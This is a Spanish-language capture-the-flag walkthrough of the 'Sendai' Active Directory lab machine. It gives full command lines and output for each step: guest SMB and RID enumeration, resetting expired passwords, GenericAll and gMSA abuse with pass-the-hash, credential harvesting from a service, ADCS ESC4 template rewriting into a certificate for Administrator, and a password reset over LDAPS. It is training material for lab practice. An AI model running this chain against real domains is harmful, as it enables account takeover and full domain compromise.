SIN CREDENCIALES — Null session y aviso de seguridad

Se comprueba el listado de shares SMB mediante null session.

enumeración de shares
nxc smb 10.129.234.66 -u 'guest' -p '' --shares
Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share config IPC$ READ Remote IPC NETLOGON READ Logon server share sendai READ company share SYSVOL READ Logon server share Users READ

Explorando los shares sendai y Users con smbclient aparecen un par de ficheros interesantes: //sendai.vl/sendai/incident.txt y //sendai.vl/sendai/security/guidelines.txt. El segundo no aporta nada, pero el primero es revelador.

incident.txt
Dear valued employees, We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts had weak and insecure passwords. To address this concern [...] all user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
Cuentas con contraseña expirada
Algunos usuarios tienen la contraseña expirada por ser insegura. Eso implica que, si no han hecho login desde entonces, se les puede fijar una contraseña nueva sin conocer la anterior — solo hace falta autenticarse con una contraseña vacía cuando el servidor la marque como expirada.
// 03

RID CYCLING — Contraseñas expiradas

Se enumera el dominio vía RID Cycling con guest y se filtra el resultado para quedarse solo con nombres de usuario.

rid cycling
nxc smb 10.129.234.66 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | awk -F '\' '{print $2}' | sort -u > users.txt

Con la lista de usuarios se prueba a autenticar con contraseña vacía para localizar las cuentas con la contraseña expirada mencionadas en el aviso.

comprobación de contraseñas expiradas
nxc smb 10.129.234.66 -u users.txt -p '' --continue-on-success
Dos cuentas con contraseña expirada
Elliot.Yates y Thomas.Powell devuelven STATUS_PASSWORD_MUST_CHANGE, confirmando que están afectadas por el reseteo masivo.

Se aprovecha para fijarles una nueva contraseña sin conocer la anterior — solo hace falta pulsar enter cuando se pida la contraseña actual.

fijar nueva contraseña
impacket-changepasswd 'sendai.vl/Elliot.Yates@sendai.vl' -newpass 'p4wn3d!' impacket-changepasswd 'sendai.vl/Thomas.Powell@sendai.vl' -newpass 'p4wn3d!'
Credenciales obtenidas
Ambas cuentas quedan con la contraseña p4wn3d!: Elliot.Yates:p4wn3d! y Thomas.Powell:p4wn3d!.
// 04

BLOODHOUND — Camino hacia mgtsvc$

Con credenciales de dominio, se lanza bloodhound-python/ldapdomaindump para mapear el AD.

recolección de datos con bloodhound
bloodhound-python -u 'Elliot.Yates' -p 'p4wn3d!' -d 'sendai.vl' -ns 10.129.234.66 -c all --zip
Cadena de abuso hacia mgtsvc$
Elliot.Yates pertenece al grupo SUPPORT, que tiene GenericAll sobre el grupo ADMSVC. ADMSVC, a su vez, tiene ReadGMSAPassword sobre la cuenta de servicio gestionada mgtsvc$, que es miembro de REMOTE MANAGEMENT USERS — con acceso WinRM directo al DC.
// 05

ABUSO DE PERMISOS — GenericAll + ReadGMSAPassword

Se abusa del GenericAll para añadirse al grupo ADMSVC.

1. añadirse al grupo admsvc
net rpc group addmem 'ADMSVC' 'Elliot.Yates' -U 'sendai.vl'/'Elliot.Yates'%'p4wn3d!' -S dc.sendai.vl

Con la membresía heredada, se lee la contraseña de la gMSA mgtsvc$.

2. lectura de contraseña gmsa
nxc ldap 10.129.234.66 -u 'Elliot.Yates' -p 'p4wn3d!' --gmsa
Hash NTLM de mgtsvc$
Se obtiene el hash NTLM de mgtsvc$: 07d0303e41518a6ffcc323f5b3744cb3.

Con el hash se conecta por WinRM.

3. acceso winrm con pass-the-hash
evil-winrm -i 10.129.234.66 -u 'mgtsvc$' -H '07d0303e41518a6ffcc323f5b3744cb3'
USER FLAG fff335936142d21a6fa44123b897cd3e

POST-EXPLOTACIÓN — Credenciales en línea de comandos de un servicio

Ya dentro, se revisan los servicios en ejecución con binario propio en busca de algo interesante.

servicios con ejecutable propio
Get-ItemProperty HKLM:\System\CurrentControlSet\Services\* -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ImagePath -ErrorAction SilentlyContinue | Where-Object { $_ -match '\.exe' -and $_ -notmatch 'svchost' }
Credenciales en la línea de comandos del servicio
El servicio C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs filtra en texto claro las credenciales clifford.davey:RFmoB2WplgE_3p, válidas contra el dominio.
// 07

ADCS ESC4 — Reescritura de plantilla vulnerable

clifford.davey es miembro del grupo CA-OPERATORS, lo que apunta directamente a un ataque de AD CS. Se enumera con certipy.

enumeración de vulnerabilidades adcs
certipy-ad find -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -vulnerable -stdout
[+] User ACL Principals : SENDAI.VL\ca-operators [!] Vulnerabilities ESC4 : User has dangerous permissions.
¿Qué es ESC4?
El grupo tiene permisos peligrosos (control total) sobre una plantilla de certificado existente. Esto permite reescribir su configuración por completo y convertirla, de facto, en una plantilla vulnerable a ESC1: se le puede activar la opción de que sea el propio solicitante quien indique el SAN/UPN del certificado.

Se reescribe la plantilla SendaiComputer con la configuración por defecto vulnerable de certipy.

1. reescritura de la plantilla
certipy-ad template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -template 'SendaiComputer' -write-default-configuration

Se solicita un certificado como Administrator, incluyendo también su SID — necesario porque el dominio tiene StrongCertificateBindingEnforcement estricto y, sin el SID, el login fallaría con un SID mismatch.

2. solicitud del certificado con sid
certipy-ad req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target 'dc.sendai.vl' -ca 'sendai-DC-CA' -template 'SendaiComputer' -upn 'Administrator@sendai.vl' -sid 'S-1-5-21-3085872742-570972823-736764132-500'
Certificado con SID emitido
Se obtiene administrator.pfx con el UPN de Administrator y su SID correcto incrustado.
// 08

SCHANNEL — Reset de contraseña vía LDAPS

Al intentar autenticarse con el certificado vía Kerberos/PKINIT, la petición falla.

intento de autenticación pkinit
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.66
[-] Got error while trying to request TGT: KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)
¿Por qué falla PKINIT?
El DC no admite la autenticación PKINIT para este caso. La alternativa es usar el certificado para autenticarse vía Schannel, abriendo una conexión LDAPS directamente en lugar de pedir un TGT por Kerberos.

Se abre una shell LDAP autenticada con el certificado vía Schannel.

shell ldap vía schannel
certipy-ad auth -pfx administrator.pfx -username 'Administrator' -domain 'sendai.vl' -ldap-shell -ldap-scheme ldaps -dc-ip 10.129.234.66

Desde esa shell, con privilegios como Administrator, se cambia su propia contraseña.

cambio de contraseña del administrador
# change_password Administrator admin123!
Contraseña de Administrator establecida
La contraseña de Administrator queda fijada en admin123!.

Con la nueva contraseña se accede por WinRM.

acceso winrm como administrator
evil-winrm -i 10.129.234.66 -u 'Administrator' -p 'admin123!'
ADMIN FLAG 1bc134a7b4ae19fcc072082026d991cf
